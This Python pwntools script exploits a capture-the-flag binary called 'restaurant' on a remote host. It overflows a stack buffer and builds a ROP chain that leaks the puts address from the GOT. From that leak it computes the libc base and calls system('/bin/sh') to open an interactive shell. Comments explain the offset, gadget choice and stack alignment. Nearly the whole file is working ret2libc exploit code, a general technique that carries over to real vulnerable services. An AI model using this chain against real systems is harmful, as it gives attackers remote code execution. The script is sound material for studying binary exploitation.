#! /usr/bin/env python

#FULL RELRO -> GOT is read-only and cannot be overwritten
#NX enabled -> Stack not executable, no shellcode
#PIE Enabled -> ASLR

from pwn import *
from pprint import pprint

context.arch = 'amd64'

elf = ELF('./restaurant')
#p = elf.process()
p = remote('46.101.33.243',32272)
offset = 32+8 #Checked stack in Ghidra. RSP - 0x20(32)bytes when allocating stack. 
#This means to reach RBP, + 32bytes. Another +8bytes to reach Return Address.

rop = ROP(elf)


POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]
NULL = next(elf.search(b"\n\x00")) #To clear buffer to get correct leaked puts address.


log.info(f'symbols_puts = {hex(elf.symbols["puts"])}') #symbols_put = plt_puts
log.info(f'plt_puts = {hex(elf.plt["puts"])}')
log.info(f'got_puts = {hex(elf.got["puts"])}') #GOT address of puts



payload = [
    b'A'*offset,

    p64(POP_RDI), #RDI is use for first argument. Save the value at the top of the stack (NULL since the RSP will point to it after POP_RDI executes) to RDI.
    p64(NULL), #NULL value to be popped in RDI.
    p64(elf.plt['puts']),

    p64(RET), #Stack alignment, make it even from 7 to 8 instructions.

    p64(POP_RDI),
    p64(elf.got['puts']), #Pass puts GOT address to puts function as argument to leak the address content.
    p64(elf.symbols['puts']), #Execute puts function. puts(got_puts) -> To get the content *got_puts.
    p64(elf.symbols['fill']) #Execute fill function again.
]


payload = b''.join(payload)


p.sendlineafter(">","1")
p.sendlineafter(">",payload)

print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))


puts = u64(p.recvuntil("\n").rstrip().ljust(8,b'\x00')) #Remove \n, padded \x00 on the right, then unpack.
log.info(f"puts found at {hex(puts)}")

#Search in lib_c database for puts with the above address. Give us the libc.so.6 as shown.
libc = ELF('libc.so.6')

libc.address = puts - libc.symbols["puts"] #libc.symbols["puts"] is an offset value. puts is *elf.got["put"] which is the address of puts in libc.
#Therefore to get the runtime libc base address, have to minus the offset.
#Example:
#libc.address = *elf.got["puts"] - libc.symbols["puts"]
#0x100000 = 0x180aa0 - 0x080aa0

log.info(f"libc base address determined {hex(libc.address)}")

#Create ROP chain
rop_libc = ROP(libc)
rop_libc.call(libc.symbols["puts"], [ next(libc.search(b"/bin/sh\x00")) ]) #For stack alignment. 3 + 3 instructions = 6 (Even)
rop_libc.call(libc.symbols["system"],[next(libc.search(b'/bin/sh\x00'))]) 

payload = [
    b"A"*offset,
    rop_libc.chain()
]

payload = b"".join(payload)

p.sendlineafter(">",payload)

# p.recvuntil("Drink something\n")
# p.sendline("1")
# p.recvuntil("You can also order something else.\n")
# p.sendline(payload)

p.interactive()


